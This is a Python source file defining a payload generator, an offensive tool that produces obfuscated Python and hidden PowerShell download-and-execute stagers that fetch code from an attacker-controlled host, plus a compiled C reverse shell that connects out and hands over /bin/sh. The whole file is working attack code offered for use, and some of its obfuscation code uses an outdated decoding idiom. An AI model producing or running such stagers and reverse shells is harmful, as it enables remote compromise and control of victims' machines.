import os, subprocess, tempfile, zlib, base64, secrets
from cryptography.fernet import Fernet

class PayloadGenerator:
    @staticmethod
    def python_stager(lhost, lport, encrypt=True, obfuscate=True):
        code = f"import urllib.request;exec(urllib.request.urlopen('http://{lhost}:{lport}/stage').read())"
        if encrypt:
            key = Fernet.generate_key()
            code = f"from cryptography.fernet import Fernet;exec(Fernet({key!r}).decrypt(urllib.request.urlopen('http://{lhost}:{lport}/stage').read()))"
        if obfuscate:
            code = f"exec({repr(base64.b64encode(zlib.compress(code.encode())).decode())}.decode('base64').decode('zlib'))"
        return code

    @staticmethod
    def powershell_cradle(lhost, lport):
        cmd = f"$c=(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/launcher');iex $c"
        return f"powershell -nop -w hidden -enc {base64.b64encode(cmd.encode('utf-16le')).decode()}"

    @staticmethod
    def binary_stager(lhost, lport, outfile=None):
        code = f"""#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>
int main() {{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {{.sin_family=AF_INET, .sin_port=htons({lport})}};
    a.sin_addr.s_addr = inet_addr("{lhost}");
    connect(s, (struct sockaddr*)&a, sizeof(a));
    dup2(s,0);dup2(s,1);dup2(s,2);
    execve("/bin/sh",0,0);
    return 0;
}}"""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(code); src=f.name
            dst = outfile or os.path.join(tempfile.gettempdir(), 'stager')
            subprocess.run(["gcc", src, "-o", dst, "-static", "-s"], check=True, capture_output=True)
            os.unlink(src)
            with open(dst, 'rb') as f: return f.read()
        except Exception as e: return f"Compilation failed: {e}".encode()
